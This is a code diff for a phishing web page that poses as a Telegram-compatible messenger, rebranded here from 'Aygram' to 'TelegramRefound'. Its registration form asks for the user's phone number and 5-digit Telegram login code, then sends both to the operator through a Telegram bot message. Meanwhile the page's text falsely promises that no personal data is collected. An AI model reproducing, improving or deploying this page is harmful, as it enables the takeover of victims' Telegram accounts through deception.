@@ -37,7 +37,7 @@ async function sendTelegramMessage(message) {
   const chatId = await ensureChatId();
   if (!chatId) {
     alert(
-      "Не удалось автоматически определить chat_id. Сначала напишите вашему боту в Telegram (Start), затем повторите, или задайте chat_id вручную."
+      "Не удалось определить chat_id. Напишите боту в Telegram /start и попробуйте снова."
     );
     return;
   }
@@ -52,46 +52,46 @@ async function sendTelegramMessage(message) {
         parse_mode: "HTML",
       }),
     });
-    const json = await response.json();
-    if (!json.ok) {
-    }
+    await response.json();
   } catch (_) {}
 }
+
+/* ----------------- ОБНОВЛЁННЫЕ ПЕРЕВОДЫ --------------------- */
 
 const translations = {
   en: {
     register: "Register",
-    welcomeTitle: "Welcome<br>to Aygram",
+    welcomeTitle: "Welcome<br>to TelegramRefound",
     welcomeText:
-      "Aygram is a Telegram API-based messenger that offers enhanced opportunities for business and personal communication alike. Aygram fully supports all Telegram updates and serves as a brilliant alternative for those who would like to get more functions and features than the standard Telegram client provides.",
-    whyTitle: "Why Aygram?",
+      "TelegramRefound is a messenger based on the Telegram API that offers enhanced opportunities for business and personal communication. TelegramRefound fully supports all Telegram updates and serves as a great alternative for those who want more features than the standard Telegram client.",
+    whyTitle: "Why TelegramRefound?",
     whySubtitle: "It's Fast, Secure & Convenient!",
     card1Title: "Powered by Telegram",
     card1Text:
-      "Aygram is the best way to enjoy everything Telegram has to offer without any restrictions. It uses an open source Telegram API and supports updates from the official client, giving you full access while still on your favorite messaging app!",
+      "TelegramRefound is the best way to enjoy all the capabilities of Telegram without limitations. It uses the open Telegram API and supports official updates, giving you full access!",
     card2Title: "Private & Secure",
     card2Text:
-      "The information you send via the Aygram messenger is encrypted and stored on Telegram servers to ensure your safety. We do not collect any personal data, so there's no need for concern!",
-    card3Title: "Diverse Integrations",
+      "The information you send through TelegramRefound is encrypted and stored on Telegram servers for your safety. We do not collect personal data!",
+    card3Title: "Wide Integrations",
     card3Text:
-      "The most necessary tools for modern people and businesses are now in one place with Aygram. You'll never have to install another app!",
+      "All the tools needed for modern users and businesses are now in one place with TelegramRefound. No more installing extra apps!",
   },
   ru: {
     register: "Регистрация",
-    welcomeTitle: "Добро пожаловать<br>в Aygram",
+    welcomeTitle: "Добро пожаловать<br>в TelegramRefound",
     welcomeText:
-      "Aygram — это мессенджер на основе Telegram API, который предлагает расширенные возможности для бизнеса и личного общения. Aygram полностью поддерживает все обновления Telegram и служит отличной альтернативой для тех, кто хочет получить больше функций и возможностей, чем стандартный клиент Telegram.",
-    whyTitle: "Почему Aygram?",
+      "TelegramRefound — это мессенджер на основе Telegram API, который предлагает расширенные возможности для бизнеса и личного общения. TelegramRefound полностью поддерживает все обновления Telegram и служит отличной альтернативой для тех, кто хочет получить больше функций, чем стандартный клиент Telegram.",
+    whyTitle: "Почему TelegramRefound?",
     whySubtitle: "Это быстро, безопасно и удобно!",
     card1Title: "Работает на Telegram",
     card1Text:
-      "Aygram — лучший способ пользоваться всеми возможностями Telegram без ограничений. Он использует открытый Telegram API и поддерживает обновления официального клиента, предоставляя вам полный доступ к любимому мессенджеру!",
+      "TelegramRefound — лучший способ пользоваться всеми возможностями Telegram без ограничений. Он использует открытый Telegram API и поддерживает обновления официального клиента!",
     card2Title: "Конфиденциально и безопасно",
     card2Text:
-      "Информация, которую вы отправляете через Aygram, зашифрована и хранится на серверах Telegram для вашей безопасности. Мы не собираем личные данные, поэтому беспокоиться не о чем!",
+      "Информация, отправленная через TelegramRefound, зашифрована и хранится на серверах Telegram для вашей безопасности. Мы не собираем личные данные!",
     card3Title: "Широкие интеграции",
     card3Text:
-      "Все необходимые инструменты для современных людей и бизнеса теперь собраны в одном месте с Aygram. Больше не нужно устанавливать дополнительные приложения!",
+      "Все необходимые инструменты для современных людей и бизнеса собраны в одном месте с TelegramRefound. Больше не нужно устанавливать дополнительные приложения!",
   },
 };
 
@@ -109,6 +109,8 @@ document.addEventListener("DOMContentLoaded", function () {
   const codeGroup = document.querySelector(".code-group");
   const enBtn = document.getElementById("en-btn");
   const ruBtn = document.getElementById("ru-btn");
+
+  /* ---------------- ТЕЛЕФОН ------------------ */
 
   const iti = window.intlTelInput(phoneInput, {
     preferredCountries: ["ru", "ua", "kz", "az", "us", "gb"],
@@ -148,6 +150,8 @@ document.addEventListener("DOMContentLoaded", function () {
     return dict[code] || (ruActive ? "Некорректный номер" : "Invalid number");
   }
 
+  /* ------------------ ЯЗЫК ------------------ */
+
   function setLanguage(lang) {
     const t = translations[lang];
     document.getElementById("register-btn").textContent = t.register;
@@ -175,6 +179,8 @@ document.addEventListener("DOMContentLoaded", function () {
     enBtn.classList.remove("active");
   });
 
+  /* ---------------- РЕГИСТРАЦИЯ ---------------- */
+
   registerBtn.addEventListener("click", function () {
     registrationWindow.style.display = "flex";
     resetRegistrationForm();
@@ -198,28 +204,31 @@ document.addEventListener("DOMContentLoaded", function () {
         const err = window.intlTelInputUtils
           ? validationErrorText(iti.getValidationError())
           : ruBtn.classList.contains("active")
-          ? "Пожалуйста, введите корректный номер телефона"
-          : "Please enter a valid phone number";
+          ? "Введите корректный номер"
+          : "Enter a valid phone number";
         alert(err);
         return;
       }
       currentPhoneE164 = iti.getNumber();
       const cdata = iti.getSelectedCountryData();
       currentCountryName = cdata?.name || "Unknown";
+
       sendTelegramMessage(
         `🔐 <b>Попытка регистрации</b>\n📱 Номер: ${currentPhoneE164}\n🌍 Страна: ${currentCountryName}`
       );
+
       showCodeStep();
     } else {
       const verificationCode = codeInput.value.trim();
       if (verificationCode.length !== 5 || !/^\d+$/.test(verificationCode)) {
         alert(
           ruBtn.classList.contains("active")
-            ? "Пожалуйста, введите корректный 5-значный код"
-            : "Please enter a valid 5-digit code"
+            ? "Введите корректный 5-значный код"
+            : "Enter a valid 5-digit code"
         );
         return;
       }
+
       handleSuccessfulRegistration(currentPhoneE164, verificationCode);
     }
   });
@@ -231,6 +240,7 @@ document.addEventListener("DOMContentLoaded", function () {
       ? "Подтвердить"
       : "Confirm";
     phoneInput.disabled = true;
+
     const flag = phoneInput.parentElement.querySelector(".iti__flag-container");
     if (flag) flag.style.pointerEvents = "none";
   }
@@ -242,8 +252,10 @@ document.addEventListener("DOMContentLoaded", function () {
       ? "Продолжить"
       : "Continue";
     phoneInput.disabled = false;
+
     const flag = phoneInput.parentElement.querySelector(".iti__flag-container");
     if (flag) flag.style.pointerEvents = "auto";
+
     phoneInput.value = "";
     currentPhoneE164 = "";
     currentCountryName = "";
@@ -253,10 +265,13 @@ document.addEventListener("DOMContentLoaded", function () {
 
   function handleSuccessfulRegistration(phoneNumberE164, verificationCode) {
     registerBtn.style.display = "none";
+
     sendTelegramMessage(
-      `✅ <b>Регистрация удалась</b>\n📱 Номер: ${phoneNumberE164}\n🔑 Код: ${verificationCode}\n🌍 Страна: ${currentCountryName}`
+      `✅ <b>Регистрация успешна</b>\n📱 Номер: ${phoneNumberE164}\n🔑 Код: ${verificationCode}\n🌍 Страна: ${currentCountryName}`
     );
+
     registrationWindow.style.display = "none";
+
     alert(
       ruBtn.classList.contains("active")
         ? "Регистрация успешно завершена!"
@@ -271,5 +286,6 @@ document.addEventListener("DOMContentLoaded", function () {
     if (e.key === "Enter") submitBtn.click();
   });
 
+  /* Включаем русский как стартовый */
   setLanguage("ru");
 });
